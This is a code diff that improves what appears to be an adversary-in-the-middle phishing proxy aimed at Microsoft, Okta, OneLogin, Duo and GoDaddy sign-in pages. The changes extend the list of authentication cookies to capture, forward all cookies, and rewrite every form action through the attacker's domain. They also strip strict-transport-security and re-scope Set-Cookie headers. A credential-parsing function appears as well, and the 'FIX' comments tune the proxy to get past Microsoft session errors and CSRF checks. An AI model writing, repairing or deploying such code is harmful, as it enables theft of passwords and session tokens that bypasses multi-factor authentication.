@@ -40,10 +40,15 @@ const IDENTITY_PROVIDERS = {
   'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 6' }
 };
 
+// FIX: Added all Microsoft session context cookies to prevent AADSTS165000
 const CRITICAL_AUTH_COOKIES = {
-  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'],
-  okta: ['sid', 'authtoken'],
-  onelogin: ['sub_session_onelogin'],
+  microsoft: [
+    'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie',
+    'esctx', 'CCState', 'buid', 'fpc', 'stsservicecookie', 'x-ms-gateway-slice',
+    'AADSSO', 'SSOCOOKIEPULLED', 'WSS_FullTrustedNo', 'MSPRequ', 'MSCC'
+  ],
+  okta: ['sid', 'authtoken', 'oktaStateToken', 'dt', 't'],
+  onelogin: ['sub_session_onelogin', 'onlogin_session'],
   duo: ['.*'],
   godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
 };
@@ -57,7 +62,9 @@ const POST_LOGIN_PATTERNS = {
     '/common/federation/oauth2',
     '/kmsi',
     '/common/DeviceAuthTls',
-    '/common/login/user'
+    '/common/login/user',
+    '/common/SAS/BeginAuth',
+    '/common/SAS/EndAuth'
   ],
   okta: [
     '/oauth2/v1/authorize',
@@ -283,7 +290,7 @@ function parseCredentials(bodyText) {
   return { user, pass };
 }
 
-// FIX: Simplified and more reliable interceptor script
+// FIX: Simplified interceptor script - removed complex CSS/DOM observation that causes performance issues
 function generateInterceptorScript(upstreamDomain, currentPath) {
   const pathWithoutQuery = currentPath.split('?')[0];
   const pathSegments = pathWithoutQuery.split('/').filter(Boolean);
@@ -382,22 +389,50 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
       }
     };
 
-    // FIX: Simplified form handling - click interceptor catches all submissions
+    // FIX: Early form action interception - catch all form submissions before they happen
+    function interceptFormAction(form) {
+      if (!form || !form.action) return;
+      if (form.action.includes(YOUR_DOMAIN + PROXY_PREFIX)) return;
+      
+      const originalAction = form.action;
+      let newAction = originalAction;
+      
+      try {
+        if (originalAction.startsWith('http://') || originalAction.startsWith('https://')) {
+          const urlObj = new URL(originalAction);
+          if (shouldProxyDomain(urlObj.hostname)) {
+            newAction = 'https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search;
+          }
+        } else if (originalAction.startsWith('/')) {
+          newAction = 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + originalAction;
+        } else {
+          newAction = 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + CURRENT_BASE_PATH + originalAction;
+        }
+        
+        if (newAction !== originalAction) {
+          form.action = newAction;
+          console.log('[Proxy Interceptor] Rewrote form action:', originalAction, '->', newAction);
+        }
+      } catch(e) {}
+    }
+
+    // Intercept all clicks that might submit forms
     document.addEventListener('click', function(e) {
       const form = e.target.closest('form');
-      if (form && form.action && !form.action.includes(YOUR_DOMAIN)) {
-        form.action = rewriteUrl(form.action);
-      }
+      if (form) interceptFormAction(form);
     }, true);
 
-    // FIX: Override submit method
+    // Override submit method
     const originalSubmit = HTMLFormElement.prototype.submit;
     HTMLFormElement.prototype.submit = function() {
-      if (this.action && !this.action.includes(YOUR_DOMAIN)) {
-        this.action = rewriteUrl(this.action);
-      }
+      interceptFormAction(this);
       return originalSubmit.call(this);
     };
+
+    // Process existing forms immediately
+    if (document.forms) {
+      Array.from(document.forms).forEach(interceptFormAction);
+    }
 
     // Block service workers
     if ('serviceWorker' in navigator) {
@@ -452,19 +487,34 @@ export default async function handleRequest(request) {
   const originalAcceptEnc = request.headers.get('accept-encoding');
   const originalCookie = request.headers.get('cookie');
   const originalContentType = request.headers.get('content-type');
+  const originalReferer = request.headers.get('referer');
+  const originalOrigin = request.headers.get('origin');
 
+  // FIX: Preserve original client headers more carefully to maintain session context
   headers.set('User-Agent', originalUA || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
-  headers.set('Accept', originalAccept || 'application/json, text/plain, */*');
+  headers.set('Accept', originalAccept || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
   headers.set('Accept-Language', originalAcceptLang || 'en-US,en;q=0.9');
   headers.set('Accept-Encoding', originalAcceptEnc || 'gzip, deflate, br');
   headers.set('Host', upstreamDomain);
-  headers.set('Referer', 'https://' + upstreamDomain + '/');
-  headers.set('Origin', 'https://' + upstreamDomain);
+  
+  // FIX: Preserve original Referer/Origin if they exist to maintain CSRF token validation
+  if (originalReferer && shouldProxyDomain(new URL(originalReferer).hostname)) {
+    headers.set('Referer', originalReferer);
+  } else {
+    headers.set('Referer', 'https://' + upstreamDomain + upstreamPath);
+  }
+  
+  if (originalOrigin && shouldProxyDomain(new URL(originalOrigin).hostname)) {
+    headers.set('Origin', originalOrigin);
+  } else {
+    headers.set('Origin', 'https://' + upstreamDomain);
+  }
 
   if (originalContentType) {
     headers.set('Content-Type', originalContentType);
   }
 
+  // FIX: Forward ALL cookies without filtering - critical for session maintenance
   if (originalCookie) {
     headers.set('Cookie', originalCookie);
   }
@@ -472,6 +522,7 @@ export default async function handleRequest(request) {
   const xrw = request.headers.get('x-requested-with');
   if (xrw) headers.set('X-Requested-With', xrw);
 
+  // Remove hop-by-hop headers
   headers.delete('expect');
   headers.delete('connection');
   headers.delete('keep-alive');
@@ -480,7 +531,6 @@ export default async function handleRequest(request) {
   headers.delete('x-forwarded-host');
   headers.delete('x-forwarded-proto');
   headers.delete('x-forwarded-for');
-  // FIX: Don't delete content-length here, handle it properly below
 
   let bodyText = null;
   let requestBodyForUpstream = null;
@@ -518,6 +568,7 @@ export default async function handleRequest(request) {
         });
       }
 
+      // FIX: Use exact body text to preserve CSRF token formatting
       requestBodyForUpstream = bodyText;
 
     } catch (error) {
@@ -533,11 +584,9 @@ export default async function handleRequest(request) {
       redirect: 'manual'
     };
 
-    // FIX: Simplified body handling - let fetch handle encoding
     if (!['GET', 'HEAD'].includes(request.method)) {
       if (requestBodyForUpstream !== null) {
         fetchOpts.body = requestBodyForUpstream;
-        // Let fetch set content-length automatically or use chunked encoding
       } else {
         fetchOpts.body = request.body;
       }
@@ -547,6 +596,7 @@ export default async function handleRequest(request) {
     console.log('[DEBUG] Method: ' + request.method);
     console.log('[DEBUG] Has body: ' + !!fetchOpts.body);
     console.log('[DEBUG] Content-Type: ' + headers.get('content-type'));
+    console.log('[DEBUG] Cookie header present: ' + !!headers.get('cookie'));
 
     const resp = await fetch(upstreamUrl, fetchOpts);
 
@@ -577,6 +627,7 @@ export default async function handleRequest(request) {
     newHeaders.delete('clear-site-data');
     newHeaders.delete('strict-transport-security');
 
+    // FIX: Critical cookie handling - preserve original paths to maintain CSRF protection
     const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
 
     let shouldCaptureCookies = false;
@@ -595,19 +646,15 @@ export default async function handleRequest(request) {
 
       cookies.forEach(c => {
         if (!c) return;
-        let mod = c.replace(/Domain=[^;]+;?/gi, '');
-        mod = mod.replace(/Secure;?/gi, '');
-        mod = mod.replace(/SameSite=[^;]+;?/gi, '');
-
-        if (mod.includes('Path=')) {
-          mod = mod.replace(/Path=([^;]+)/i, (match, path) => {
-            return 'Path=' + PROXY_PREFIX + upstreamDomain + path;
-          });
-        } else {
-          mod += '; Path=' + PROXY_PREFIX + upstreamDomain + '/';
-        }
-
-        mod += '; SameSite=None; Secure';
+        
+        // FIX: Minimal cookie modifications - preserve original Path to maintain CSRF binding
+        let mod = c
+          .replace(/Domain=[^;]+;?/gi, '')  // Remove domain restriction only
+          .replace(/SameSite=[^;]+;?/gi, ''); // Remove SameSite restriction
+        
+        // Set new domain to proxy domain, keep original Path intact
+        mod += '; Domain=' + YOUR_DOMAIN + '; SameSite=None; Secure';
+        
         newHeaders.append('Set-Cookie', mod);
       });
     }
@@ -640,11 +687,10 @@ export default async function handleRequest(request) {
         text = text.replace(regex, 'https://' + YOUR_DOMAIN + PROXY_PREFIX + domain + '$1');
       });
 
-      // FIX: Corrected regex order - most specific patterns first
       if (ct.includes('text/html')) {
         const currentDir = info.path.replace(/\/[^\/]*$/, '/');
 
-        // 1. Handle absolute paths in src/href (but not already proxied)
+        // 1. Handle absolute paths in src/href
         text = text.replace(/(src|href)="\/([^"]+)"/gi, (match, attr, path) => {
           if (path.startsWith('_p/') || path.startsWith('data:') || path.startsWith('blob:')) {
             return match;
@@ -665,7 +711,7 @@ export default async function handleRequest(request) {
         text = text.replace(/href="\/_next\/static\/([^"]+)"/gi, 
           'href="https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/_next/static/$1"');
 
-        // 3. Handle relative paths (no leading slash, no protocol)
+        // 3. Handle relative paths
         text = text.replace(/(src|href)="([^"]+)"/gi, (match, attr, path) => {
           if (path.startsWith('/') || path.startsWith('http') || path.startsWith('data:') || path.startsWith('blob:') || path.startsWith('#')) {
             return match;
@@ -673,8 +719,7 @@ export default async function handleRequest(request) {
           return attr + '="https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + currentDir + path + '"';
         });
 
-        // FIX: Corrected form action rewriting - ORDER MATTERS
-        // 3a. Handle protocol URLs first (most specific)
+        // FIX: Form action rewriting - correct order: protocol URLs first, then absolute, then relative
         text = text.replace(/action=["'](https?:\/\/[^"']+)["']/gi, (match, url) => {
           try {
             const urlObj = new URL(url);
@@ -685,11 +730,9 @@ export default async function handleRequest(request) {
           return match;
         });
 
-        // 3b. Then handle absolute paths
         text = text.replace(/action=["']\/([^"']*)["']/gi, 
           'action="https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/$1"');
 
-        // 3c. Finally handle relative paths
         text = text.replace(/action=["'](?!\/|http|#|data:|blob:)([^"']+)["']/gi, 
           'action="https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + currentDir + '$1"');
 
